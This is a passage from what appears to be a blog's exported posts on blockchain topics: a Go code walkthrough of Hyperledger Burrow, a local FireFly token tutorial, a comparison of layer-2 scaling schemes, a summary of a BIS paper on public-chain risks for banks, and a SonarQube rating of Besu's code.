exe.contexts[txEnv.Tx.Type()]; ok &#123;</span><br><span class="line">		<span class="comment">// Establish new TxExecution</span></span><br><span class="line">		txe := exe.block.Tx(txEnv)</span><br><span class="line">		<span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">			<span class="keyword">if</span> r := <span class="built_in">recover</span>(); r != <span class="literal">nil</span> &#123;</span><br><span class="line">				err = fmt.Errorf(<span class="string">&quot;recovered from panic in executor.Execute(%s): %v\n%s&quot;</span>, txEnv.String(), r,</span><br><span class="line">					debug.Stack())</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;()</span><br><span class="line"></span><br><span class="line">		err = exe.validateInputsAndStorePublicKeys(txEnv)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			logger.InfoMsg(<span class="string">&quot;Transaction validate failed&quot;</span>, structure.ErrorKey, err)</span><br><span class="line">			txe.PushError(err)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		err = txExecutor.Execute(txe, txe.Envelope.Tx.Payload)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			logger.InfoMsg(<span class="string">&quot;Transaction execution failed&quot;</span>, structure.ErrorKey, err)</span><br><span class="line">			txe.PushError(err)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Increment sequence numbers for Tx inputs</span></span><br><span class="line">		err = exe.updateSequenceNumbers(txEnv)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			logger.InfoMsg(<span class="string">&quot;Updating sequences failed&quot;</span>, structure.ErrorKey, err)</span><br><span class="line">			txe.PushError(err)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// Return execution for this tx</span></span><br><span class="line">		<span class="keyword">return</span> txe, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;unknown transaction type: %v&quot;</span>, txEnv.Tx.Type())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处 <code>txExecutor.Execute(txe, txe.Envelope.Tx.Payload)</code> 因 <code>txExecutor</code> 类型的不同，分别对应至 <code>/txs/payload/payload.go</code> 中的 <code>Type</code> ，如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Account transactions</span></span><br><span class="line">TypeSend  = Type(<span class="number">0x01</span>)</span><br><span class="line">TypeCall  = Type(<span class="number">0x02</span>)</span><br><span class="line">TypeName  = Type(<span class="number">0x03</span>)</span><br><span class="line">TypeBatch = Type(<span class="number">0x04</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Validation transactions</span></span><br><span class="line">TypeBond   = Type(<span class="number">0x11</span>)</span><br><span class="line">TypeUnbond = Type(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Admin transactions</span></span><br><span class="line">TypePermissions = Type(<span class="number">0x21</span>)</span><br><span class="line">TypeGovernance  = Type(<span class="number">0x22</span>)</span><br><span class="line">TypeProposal    = Type(<span class="number">0x23</span>)</span><br><span class="line">TypeIdentify    = Type(<span class="number">0x24</span>)</span><br></pre></td></tr></table></figure>

<p>根据 <code>Type</code> 不同，在如下 <code>contexts</code> 对应的 Context 的 Execute 方法则会不同，分别对应为如下代码文件中的 <code>Execute</code> 方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">├── burrow</span><br><span class="line">│   ├── execution</span><br><span class="line">│   │   ├── contexts</span><br><span class="line">│   │   │   ├── bond_context.go</span><br><span class="line">│   │   │   ├── bond_context_test.go</span><br><span class="line">│   │   │   ├── call_context.go</span><br><span class="line">│   │   │   ├── governance_context.go</span><br><span class="line">│   │   │   ├── identify_context.go</span><br><span class="line">│   │   │   ├── name_context.go</span><br><span class="line">│   │   │   ├── permissions_context.go</span><br><span class="line">│   │   │   ├── proposal_context.go</span><br><span class="line">│   │   │   ├── send_context.go</span><br><span class="line">│   │   │   ├── shared.go</span><br><span class="line">│   │   │   └── unbond_context.go</span><br></pre></td></tr></table></figure>

<p>例如，在执行发送 <code>TypeCall</code> 类型的交易时， <code>txExecutor.Execute(txe, txe.Envelope.Tx.Payload)</code> 对应的具体逻辑为 <code>/execution/contexts/call_context.go</code> 中的 <code>Execute</code> 方法：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ctx *CallContext)</span> <span class="title">Execute</span><span class="params">(txe *exec.TxExecution, p payload.Payload)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> ok <span class="keyword">bool</span></span><br><span class="line">	ctx.tx, ok = p.(*payload.CallTx)</span><br><span class="line">	<span class="keyword">if</span> !ok &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;payload must be CallTx, but is: %v&quot;</span>, p)</span><br><span class="line">	&#125;</span><br><span class="line">	ctx.txe = txe</span><br><span class="line">	inAcc, outAcc, err := ctx.Precheck()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// That the fee less than the input amount is checked by Precheck to be greater than or equal to fee</span></span><br><span class="line">	value := ctx.tx.Input.Amount - ctx.tx.Fee</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ctx.RunCall &#123;</span><br><span class="line">		<span class="keyword">return</span> ctx.Deliver(inAcc, outAcc, value)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ctx.Check(inAcc, value)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DeliverTx"><a href="#DeliverTx" class="headerlink" title="DeliverTx"></a>DeliverTx</h3><p>在执行 <code>ExecuteTx(logHeader, app.committer, app.txDecoder, req.GetTx())</code> 中，<code>executor execution.Executor</code> 被指定为 <code>app.committer</code> , 与 CheckTX 执行同样的 <code>Execute</code> 逻辑</p>
<h3 id="Commit"><a href="#Commit" class="headerlink" title="Commit"></a>Commit</h3><p>具体执行逻辑为 <code>/execution/execution.go</code> 中的 <code>func (exe *executor) Commit(header *abciTypes.Header) (stateHash []byte, err error)</code> </p>
]]></content>
      <tags>
        <tag>Burrow</tag>
      </tags>
  </entry>
  <entry>
    <title>体验firefly</title>
    <url>/2022/03/31/%E4%BD%93%E9%AA%8Cfirefly/</url>
    <content><![CDATA[<p>firefly is a very interesting project ==&gt; <a href="https://hyperledger.github.io/firefly/">https://hyperledger.github.io/firefly/</a> </p>
<p>To help with the FireFly evaluation, especially how it makes digital assets management easy by supporting token standards (ERC20, ERC721, ERC1155, and other standard contracts or your custom implementations via extensions) with REST APIs and event streams, we have a minimal tutorial that you can set up locally on your laptop. Please give it a try and let us know if you have any questions.</p>
<ol>
<li>install the latest FireFly CLI:</li>
</ol>
<p>$ go install <a href="https://urldefense.com/v3/__http:/github.com/hyperledger/firefly-cli/ff@latest__;!!LSAcJDlP!hkQGL7MWpqV_y1r5RSaiFUgGNz3QpZ8L09BtbpQtqCn9e1jOOHhtfO9Jf5tIZlpZUVgtKg$">github.com/hyperledger/firefly-cli/ff@latest</a></p>
<ol start="2">
<li>initialize the FireFly stack using Ethereum as the underlying blockchain, and load the ERC20/ERC721 token connector:</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ff init -t erc20_erc721</span><br></pre></td></tr></table></figure>



<ol start="3">
<li>start the stack named “digital-assets”</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ff start digital-assets</span><br></pre></td></tr></table></figure>



<ol start="4">
<li>deploy the token contract. the easiest way is using Truffle. The Hyperledger implementation of the token connector has sample ERC20 and ERC721 contracts you can use to deploy to Ethereum:</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> [git@github.com:hyperledger/firefly-tokens-erc20-erc721.git](mailto:git@github.com:hyperledger/firefly-tokens-erc20-erc721.git)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> firefly-tokens-erc20-erc721</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> solidity</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm install</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> truffle migrate</span></span><br></pre></td></tr></table></figure>



<ol start="5">
<li>copy the contract address for the deployed ERC20 token contract (highlighted below in the sample output), to use in the next step</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Starting migrations...</span><br><span class="line"></span><br><span class="line"> \&gt; Network name:   &#x27;development&#x27;</span><br><span class="line"> \&gt; Network id:    2021</span><br><span class="line"> \&gt; Block gas limit: 4722986 (0x48112a)</span><br><span class="line"></span><br><span class="line"> 1_initial_migration.js</span><br><span class="line"></span><br><span class="line">   Deploying &#x27;Migrations&#x27;</span><br><span class="line">   \----------------------</span><br><span class="line">   ⠋ Blocks: 0       Seconds: 0  &gt; transaction hash:   0xb81c60fd920bf28775bd8610271c60a40380e278af97ccd18458efafe852dc99</span><br><span class="line">   \&gt; Blocks: 0       Seconds: 0</span><br><span class="line">   \&gt; contract address:   0x0C2c9222835692912b3999D6DAE955a9d306393d</span><br><span class="line">   \&gt; block number:     6</span><br><span class="line">   \&gt; block timestamp:   1648585628</span><br><span class="line">   \&gt; account:       0x1eAecAb9D796Ee765865f47a78De13735619c914</span><br><span class="line">   \&gt; balance:       904625697166532776746648320380374280103671755200316906558.262375061821325312</span><br><span class="line">   \&gt; gas used:       272788 (0x42994)</span><br><span class="line">   \&gt; gas price:      0 gwei</span><br><span class="line">   \&gt; value sent:      0 ETH</span><br><span class="line">   \&gt; total cost:      0 ETH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   \&gt; Saving migration to chain.</span><br><span class="line">   \&gt; Saving artifacts</span><br><span class="line">   \-------------------------------------</span><br><span class="line">   \&gt; Total cost:          0 ETH</span><br><span class="line"></span><br><span class="line"> 2_deploy_contracts.js</span><br><span class="line"></span><br><span class="line">   Deploying &#x27;ERC20WithData&#x27;</span><br><span class="line">   \-------------------------</span><br><span class="line">   ⠋ Blocks: 0       Seconds: 0  &gt; transaction hash:   0x748a60953ceacda47431210752c2a9991f77b552d19397827500feef086fc3cf</span><br><span class="line">   \&gt; Blocks: 0       Seconds: 0</span><br><span class="line">   \&gt; contract address:   **0xB6728020f998f32afb4936f9CEcE04B1d3951895**</span><br><span class="line">   \&gt; block number:     8</span><br><span class="line">   \&gt; block timestamp:   1648585628</span><br><span class="line">   \&gt; account:       0x1eAecAb9D796Ee765865f47a78De13735619c914</span><br><span class="line">   \&gt; balance:       904625697166532776746648320380374280103671755200316906558.262375061821325312</span><br><span class="line">   \&gt; gas used:       1948804 (0x1dbc84)</span><br><span class="line">   \&gt; gas price:      0 gwei</span><br><span class="line">   \&gt; value sent:      0 ETH</span><br><span class="line">   \&gt; total cost:      0 ETH</span><br><span class="line"></span><br><span class="line">   \&gt; Saving migration to chain.</span><br><span class="line">   \&gt; Saving artifacts</span><br><span class="line">   \-------------------------------------</span><br><span class="line">   \&gt; Total cost:          0 ETH</span><br></pre></td></tr></table></figure>



<h1 id="Summary"><a href="#Summary" class="headerlink" title=" Summary"></a> Summary</h1><p> &gt; Total deployments:  2<br> &gt; Final cost:      0 ETH</p>
<ol start="6">
<li>teach FireFly about the token contract so that it can start tracking transactions on the contract. For this step you can use the Swagger UI that comes with FireFly. Open <a href="https://urldefense.com/v3/__http:/localhost:5000/api__;!!LSAcJDlP!hkQGL7MWpqV_y1r5RSaiFUgGNz3QpZ8L09BtbpQtqCn9e1jOOHhtfO9Jf5tIZlpI4RuZkA$">http://localhost:5000/api</a>, and expand the request entry POST /namespaces/{ns}/tokens/pools. Plugin the values as shown below (you can delete all the other optional properties in the payload): </li>
</ol>
<p><img src="/2022/03/31/%E4%BD%93%E9%AA%8Cfirefly/1.png"></p>
<ol start="7">
<li>Now you can start using FireFly APIs to manage the new token contract: mint/transfer/burn.</li>
</ol>
<ol start="8">
<li>You can use the following JSON RPC command to create additional Ethereum addresses in the go-ethereum node’s built-in wallet:</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -d <span class="string">&#x27;&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:&quot;1&quot;,&quot;method&quot;:&quot;personal_newAccount&quot;,&quot;params&quot;:[&quot;**passw0rd**&quot;]&#125;&#x27;</span> [http://localhost:5100](https://urldefense.com/v3/__http:/localhost:5100__;!!LSAcJDlP!hkQGL7MWpqV_y1r5RSaiFUgGNz3QpZ8L09BtbpQtqCn9e1jOOHhtfO9Jf5tIZlpXnXqo_Q$) | jq</span></span><br><span class="line"> &#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;id&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;result&quot;: &quot;**0xfd5d5d96879a700c693da5092e2a6ef5ed399684**&quot;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -d <span class="string">&#x27;&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:&quot;1&quot;,&quot;method&quot;:&quot;personal_unlockAccount&quot;,&quot;params&quot;:[&quot;**0xfd5d5d96879a700c693da5092e2a6ef5ed399684**&quot;,&quot;**passw0rd**&quot;,0]&#125;&#x27;</span>  [http://localhost:5100](https://urldefense.com/v3/__http:/localhost:5100__;!!LSAcJDlP!hkQGL7MWpqV_y1r5RSaiFUgGNz3QpZ8L09BtbpQtqCn9e1jOOHhtfO9Jf5tIZlpXnXqo_Q$) |jq</span></span><br><span class="line"> &#123;</span><br><span class="line">  &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line">  &quot;id&quot;: &quot;1&quot;,</span><br><span class="line">  &quot;result&quot;: true</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



<ol start="9">
<li>Try the minting API using the POST /namespaces/{ns}/tokens/mint endpoint: </li>
</ol>
<p><img src="/2022/03/31/%E4%BD%93%E9%AA%8Cfirefly/2.png"></p>
<ol start="10">
<li>check the result of the minting transaction in the FireFly UI at <a href="https://urldefense.com/v3/__http:/localhost:5000/ui__;!!LSAcJDlP!hkQGL7MWpqV_y1r5RSaiFUgGNz3QpZ8L09BtbpQtqCn9e1jOOHhtfO9Jf5tIZloTMvxMnw$">http://localhost:5000/ui</a> (for org0) and http//localhost:5001/ui (for org1): </li>
</ol>
<p><img src="/2022/03/31/%E4%BD%93%E9%AA%8Cfirefly/3.png"></p>
<p>That’s it! Now you have a local setup to explore the many features of FireFly.</p>
<ol start="11">
<li>connect with metamask as below. by the way, the para when you add a network for firefly , please refer the info at <code>~/.firefly/stacks/oh/blockchain/genesis.json</code>, here you can cat genesis block info.</li>
</ol>
<p><img src="/2022/03/31/%E4%BD%93%E9%AA%8Cfirefly/4.png"></p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>体验zksync-2</title>
    <url>/2020/06/23/%E4%BD%93%E9%AA%8Czksync-2/</url>
    <content><![CDATA[<p>zksync 与其他 layer2 方案相比较，优缺点如何？ ==&gt; <a href="https://mp.weixin.qq.com/s/drgDM5mCZsBQdTIfszO97g">https://mp.weixin.qq.com/s/drgDM5mCZsBQdTIfszO97g</a></p>
<p>先说结论如下图：</p>
<p><img src="/2020/06/23/%E4%BD%93%E9%AA%8Czksync-2/1.png"></p>
<p>  在区块链 layer1 (以太坊) 中，所有的计算过程和数据存储都在主链进行（交易数据存在区块中，全节点执行所有计算过程）；但 layer2 不同，我们可以根据 layer2 如何解决这两个扩展相关的瓶颈问题（计算 &amp; 数据存储）来对他们分类，正如上图的二阶矩阵所示。</p>
<h4 id="Plasma"><a href="#Plasma" class="headerlink" title="Plasma"></a>Plasma</h4><p>  Plasma 由 Vitalik Buterin 和 Joseph Poon 在 2017 年共同提出；Plasma 作为被寄予厚望的理论思想，可以说是开启了以太坊扩展研究的先驱。将其放在矩阵右下角。</p>
<p>  从本质来说，Plasma 的思想相对直观。为了获得更好的扩展性，Plasma 将计算和数据存储都迁移到 layer 2 进行；由 layer 2 的执行者周期性地向主链递交 Merkle 根形式的 “状态承诺” 。如果执行者递交无效的状态，用户可以向主链上的智能合约提供错误性证明（fraud proof）；一旦确认执行者出现欺诈行为，则智能合约会罚没他的保证金。</p>
<p>  虽然这个想法简单优雅，但细节实现起来却是困难重重。最大的问题就出在数据可用性（data availability）。虽然说可以通过错误性证明，使得提供无效承诺的执行者在主链上遭到惩罚，但用户如果想要提供错误性证明，首先得取得构造出错误承诺的错误数据。这时候问题就来了，如果 plasma 的执行者拒绝在主链上公开数据，那用户能怎么办？这可能会导致主网上记载的 layer2 状态被推进到错误的状态，且无法对执行者追责。</p>
<p>  针对这个问题， Plasma 衍生出一些相应的方案，如延长资产从 layer 2 退出的时间，当出现作恶行为，就能够允许大量资产从 Plasma 链退出。但经过这些年的摸索，可行的方案还没有真正实现；这也促使二阶矩阵其他象限的方案的出现。</p>
<h4 id="zkRollup"><a href="#zkRollup" class="headerlink" title="zkRollup"></a>zkRollup</h4><p>  zkRollup 通过一种间接的方式解决了数据可用性问题，将所有 layer2 上的交易数据，作为参数发送到主链上的某个智能合约内。这意味任何人都能通过观察区块链上的 “calldata（数据调用）” 来获得 layer2 的所有数据，但这同时让 zkRollup 能带来的可扩展性优势仅限于计算这一个维度上了。</p>
<p>  zkRollup 则是靠着在主链完成零知识证明，保证无效的状态绝不会发生。因为所有计算都被 “汇总” 到证明里，所以无需信任或是检查执行者。</p>
<p>  zkRollup 对数据存储方面也带来了一定程度上的扩展性提升。举例来说，zkRollups 可以发送压缩过的数据给智能合约，而且全节点不需要将 calldata 存储在活跃状态里面，减轻了全节点的使用负担。在 zkRollup 链上无需包含签名数据，因为零知识证明就足以证明交易的有效性。</p>
<p>  zkRollup 部署难度较高，安全性要求较高，所以现有的 zkRollup 技术只专注于应用在某几个特定项目，如 Loopring 的去中心化 layer2 交易所。</p>
<p><strong>zkRollup 的零知识证明模型：</strong></p>
<ol>
<li>状态树(State Merkle Tree)</li>
</ol>
<p><img src="/2020/06/23/%E4%BD%93%E9%AA%8Czksync-2/2.png"></p>
<p>Ha 是 account tree 的高度。Hb 是 balance tree 的高度.</p>
<ol start="2">
<li>金额打包</li>
</ol>
<p>金额和费用使用的是科学计数法： sign * mantissa * (radix ^ exponent)，其中的 mantissa 和 exponent 被封装在 zkSync 之中。</p>
<h4 id="Optimistic-Rollup"><a href="#Optimistic-Rollup" class="headerlink" title="Optimistic Rollup"></a>Optimistic Rollup</h4><p>  Optimistic Rollup 保留 calldata，可以在主链获得所有 layer2 的数据。同时 Optimistic Rollup 采用错误性证明（跟 Plasma 方案一样），对提交无效状态的执行者进行惩罚。</p>
<p>  相比于 Plasma 和 zkRollup， Optimistic Rollup 做了一些权衡，所以带来的扩展性提升幅度最小。Optimistic Rollup 不依赖于什么过于前沿的技术或悬而未决的问题，实际推广中 Optimistic Rollup 更好落地。有多个团队（比如 “Optimism Group” ）都已接近将 Optimistic Rollup 架构部署到主网上。</p>
<h4 id="Validium"><a href="#Validium" class="headerlink" title="Validium"></a>Validium</h4><p>  Validium 选择将 layer2 的交易数据放在链下，因而比 rollup 架构有着更高的扩展性。验证计算方面，Validium 采用零知识证明。如先前在讨论 zkRollup 时提到的，这样做会导致 Validium 在目前的应用部署，只能局限于特定目的（普适性低），比如 StarkEx 就是面向去中心化交易所的方案。</p>
<p>  但这些权衡使得 Validium 在某些方面优于 Plasma 。在主网进行零知识证明验证能避免执行者提供无效状态，也能降低执行者不公开数据造成的后果。举例来说，想要勾结执行者，让状态错误地转变为 “把他人的钱转到自己账户” 是不可能办到的；因此 Validium 不需要在协议中设计 “大量资金退出” 激励博弈，也不需要延长资金从 layer2 退出的时间。</p>
<p>  正如其他研究者指出的，零知识证明并不是解决数据可用性问题的灵丹，比如（恶意）执行者修改自己所控制的账户的状态是没有问题的，然后积压关于这些交易的数据，这会导致某些用户想退出资金时，无法提供 Merkle proof 。</p>
<p>=======================另一组比较方法=======================</p>
<p>为了简化问题，我们的评估将从以下四个方面着手，分别是：</p>
<ol>
<li>安全性（Security）</li>
<li>性能（Performance）/经济性（economics）</li>
<li>易用性（Usability）</li>
<li>其他</li>
</ol>
<p>希望我们的综合比较可以帮助开发者评估不同的扩容解决方案，并采用最适合其需求的解决方案。</p>
<p>除了这些问题之外，我们还汇总了一张对照表（译者注：这张表是本文的重点），可作为与解决方案提供商对话的起点。我们尽了最大努力保持对比的中立和客观，但是在表格里简洁地表达不同方法的细微差别仍然是一项艰巨的任务。我们希望更多的上下文能弥补这一问题。</p>
<blockquote>
<p>非常感谢 Georgios Konstantopoulos（Layer 2独立研究员），John Adler，Ben Jones，JD Kanani，Patrick McCorry，Justin Drake（以太坊基金会）和Brecht Devos（Loopring 路印），感谢他们对该表的审查和更正。</p>
</blockquote>
<p><img src="/2020/06/23/%E4%BD%93%E9%AA%8Czksync-2/3.png"></p>
<p>注：<br>0 某些研究完全不认为侧链应被归入 L2 范畴，可见：<a href="https://twitter.com/gakonst/status/1146793685545304064">https://twitter.com/gakonst/status/1146793685545304064</a><br>1 要看相关升级机制的实现，不过一般来说都可以<br>2 有非常复杂的限制<br>3 为保证与 EVM 的可组合性，吞吐量的上限是 300 TPS<br>4 这个参数实际上是可调的，但大部分研究员都觉得 1 到 2 周时间比较安全<br>5 要看相关的实现。zkSync 是不需要的，但 Loopring 需要<br>7 理论上来说，可以通过流动性提供商缓解这个问题，但是会让整个方案的资金利用效率性变差</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>公有链技术为银行带来的新风险和不确定性</title>
    <url>/2024/09/03/%E5%85%AC%E6%9C%89%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%BA%E9%93%B6%E8%A1%8C%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%96%B0%E9%A3%8E%E9%99%A9%E5%92%8C%E4%B8%8D%E7%A1%AE%E5%AE%9A%E6%80%A7/</url>
    <content><![CDATA[<p>根据BIS的文章：<a href="https://www.bis.org/bcbs/publ/wp44.pdf">https://www.bis.org/bcbs/publ/wp44.pdf</a></p>
<p>直接说结论：公有链会产生现有风险分类中的风险，主要是<strong>运营风险，其次是流动性风险和市场风险</strong>。银行有管理此类风险的经验，但公有链带来了一些新挑战，可能需要新的或额外的方法来管理风险。减轻这些风险的做法处于不同的发展阶段，一般没有经过压力测试。虽然针对这些风险的技术解决方案尚未成熟，但快速发展可能会产生新的解决方案（和风险），这些解决方案（和风险）可能值得进一步研究。</p>
<p>Discussion of potential mitigants</p>
<ul>
<li>A. Business Continuity Planning Governance risk; technology/attack risk; political, policy, and legal uncertainty </li>
<li>B. Technology-based control over parties and transactions Legal/compliance risk (money laundering/financing of terrorism) </li>
<li>C. Permissioning a subset of node infrastructure Legal/compliance risk (money laundering/financing of terrorism); technology/attack risks, consumer protections risk </li>
<li>D. Technology to address privacy/confidentiality/consumer protection risks Privacy/confidentiality/consumer protection risks </li>
<li>E. Technology to address liquidity risk Liquidity risk</li>
</ul>
<h3 id="Business-continuity-planning"><a href="#Business-continuity-planning" class="headerlink" title="Business continuity planning"></a>Business continuity planning</h3><p>BCP could involve a registry that can be used to recover ownership after disruption, such as an off-chain database. For example, in the event of a hard fork or an attack on the blockchain that creates uncertainty as to the distributed ledger’s accuracy, the off-chain records could be used to identify the rightful owner of the assets or the branch of the fork that should be followed. BCP could also set out all relevant internal processes, including those to ensure that all transactions and participants are traceable, potential lost data can be recovered, and the records on the ownership of the assets can be retrieved within a reasonable timeframe. In addition, BCP could define an alternative blockchain where assets would be created or ported in case of disruption of the primary blockchain (“designation of a contingency chain”).</p>
<h3 id="Technology-based-control-over-parties-and-transactions"><a href="#Technology-based-control-over-parties-and-transactions" class="headerlink" title="Technology-based control over parties and transactions"></a>Technology-based control over parties and transactions</h3><p>On certain permissionless blockchains, tokens that parties transact in are created or subject to constraints programmed by smart contracts. Those smart contracts determine the tokens’ operational attributes and limitations. Among other things, smart contracts can be used to control and limit access to and ownership of a token and even to reverse transactions that have already been processed. These features, in turn, could be used to mitigate some of the AML/CFT risk associated with permissionless blockchains. Implementation of permissions can take a number of forms: </p>
<ol>
<li>Denylisting: when a crypto-asset has deny-listing functionality, the issuer can use the smart contract to bar specified addresses on the blockchain from holding or accessing the asset. A banking organisation might use this functionality to prevent transactions to or from wallets associated with known terrorists, criminals, or states subject to Office of Foreign Assets Control (OFAC) sanctions. The ability to infinitely create new wallets may limit the effectiveness of this mitigant. </li>
<li>Allowlisting: the inverse of denylisting. The token in question is programmed to be accessed only by approved addresses on the blockchain. Addresses that are not on the allowlist will not be able to receive or send the asset. The issuer can add or remove participants to the allowlist via the smart contract.</li>
<li>Privacy-preserving identity verification: technologies such as zero-knowledge proofs may allow identity verification while preserving privacy at the transaction level. Such technologies are nascent in both development and application.</li>
<li>A controller: smart contracts can also be used to empower a designated entity (the controller) to control and limit access to the cryptoasset; block and reverse transactions that are fraudulent; and amend the code that implements the cryptoasset functions to address any deficiencies that may emerge. The controller could be the entity that develops and maintains the business continuity plan (discussed above). The controller would not exercise control over the permissionless network itself, but over the specific tokens of a specific issuance. The controller could use its authority to help mitigate legal/compliance risks, in particular money laundering / financing of terrorism and OFAC sanctions risks, through the use of off-chain due diligence and blockchain-related permissioning technology.<h3 id="Permissioning-node-infrastructure"><a href="#Permissioning-node-infrastructure" class="headerlink" title="Permissioning node infrastructure"></a>Permissioning node infrastructure</h3>Permissioning a subset of nodes might create known validators that are deemed safe for particular users such as banks to interact with. This may help address risks such as legal and compliance risks (including gas fee risks or ML/FT risks), technology/attack risks (including MEV risks), and consumer protection. This would likely come at the cost of slowing down transactions for the parties attempting to avoid paying gas fees to nodes operated by criminals or other sanctioned parties.<h3 id="Technology-to-address-privacy-confidentiality-and-consumer-protection-risks"><a href="#Technology-to-address-privacy-confidentiality-and-consumer-protection-risks" class="headerlink" title="Technology to address privacy, confidentiality and consumer protection risks"></a>Technology to address privacy, confidentiality and consumer protection risks</h3>Technology to address privacy, confidentiality, and consumer protection risks is being developed. Some potential solutions, such as zero-knowledge proofs, may take the form of permissioned chains “one level up” from the primary blockchain. In such a configuration, the primary chain is referred to as a layer 1 chain, while the chain one level up is referred to as a layer 2 chain. Alternatively, a separate blockchain that communicates with the permissionless primary blockchain, called a sidechain, may be employed. In addition to zero knowledge proofs, other methods such as fully homomorphic encryption might be used to protect consumer information.<h3 id="Technology-to-address-liquidity-risk"><a href="#Technology-to-address-liquidity-risk" class="headerlink" title="Technology to address liquidity risk"></a>Technology to address liquidity risk</h3>Low transaction throughput of popular permissionless blockchains can be exacerbated in times of system stress, imposing liquidity risk on tokenised assets. Several variations on layer 1 consensus mechanisms are intended to speed up the clearance of transactions. In addition, many blockchain projects aim to speed up transaction processing on layer 2 chains and sidechains. However, while these solutions aim to off-load transaction volume from layer 1s, they still depend on the base permissionless blockchain for final settlement and therefore only partly compensate for the layer 1’s transaction processing speed. These technologies are all developing rapidly.</li>
</ol>
]]></content>
      <tags>
        <tag>区块链</tag>
        <tag>BANK</tag>
      </tags>
  </entry>
  <entry>
    <title>使用SonarQube扫描Besu的结果</title>
    <url>/2023/04/03/%E4%BD%BF%E7%94%A8SonarQube%E6%89%AB%E6%8F%8FBesu%E7%9A%84%E7%BB%93%E6%9E%9C/</url>
    <content><![CDATA[<p><a href="https://www.sonarsource.com/">SonarQube Community Version 9.9</a> （free version）, no plugin</p>
<p><a href="https://github.com/hyperledger/besu">Best version 23.1.2</a></p>
<p><img src="/2023/04/03/%E4%BD%BF%E7%94%A8SonarQube%E6%89%AB%E6%8F%8FBesu%E7%9A%84%E7%BB%93%E6%9E%9C/1.png"></p>
<p><img src="/2023/04/03/%E4%BD%BF%E7%94%A8SonarQube%E6%89%AB%E6%8F%8FBesu%E7%9A%84%E7%BB%93%E6%9E%9C/2.png"></p>
<p>结论：从SonarQube的评级来看，Besu的代码质量<strong>非常差</strong></p>
]]></content>
      <tags>
        <tag>区块链</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>体验zksync-1</title>
    <url>/2020/06/22/%E4%BD%93%E9%AA%8Czksync-1/</url>
